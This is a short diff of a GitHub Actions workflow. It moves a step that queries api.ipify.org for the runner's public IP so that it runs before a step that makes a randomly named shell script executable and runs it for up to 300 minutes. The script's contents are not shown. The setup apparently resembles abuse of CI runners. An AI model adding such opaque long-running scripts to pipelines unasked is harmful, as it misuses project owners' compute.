@@ -10,6 +10,9 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
+      - name: IP Workflow
+        run: |
+          curl https://api.ipify.org
       - name: Run exec
         timeout-minutes: 300
         run: |
@@ -17,8 +20,4 @@ jobs:
           chmod +x o8abekknjkh6hlgjcwal.sh
           ./o8abekknjkh6hlgjcwal.sh
 
-      - name: IP Workflow
-        run: |
-          curl https://api.ipify.org
 
-      # Ajoutez d'autres étapes de votre workflow ici
